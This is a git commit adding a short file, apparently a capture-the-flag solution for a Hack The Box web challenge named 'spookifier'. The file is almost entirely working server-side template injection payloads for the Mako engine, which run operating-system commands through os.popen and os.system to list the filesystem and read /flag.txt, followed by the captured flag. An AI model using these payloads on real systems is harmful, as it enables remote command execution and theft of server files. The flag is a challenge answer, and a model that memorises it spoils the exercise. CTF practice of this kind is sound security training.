8d1050ba7492b92712040b37c99a181bfb143035
szhan21 <shunda.zhang@intel.com>
2024-01-25 21:58:49 +0800

    Solved spookifier!

---
+++ ctf/web/web_spookifier/dec.py
@@ -0,0 +1,18 @@
+'''
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
+
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+
+${self.module.cache.util.os.system("id")}
+
+${self.module.cache.util.os.popen('id').read()}
+${self.module.cache.util.os.popen('ls /').read()}
+${self.module.cache.util.os.popen('cat /flag.txt').read()}
+
+HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
+
+'''
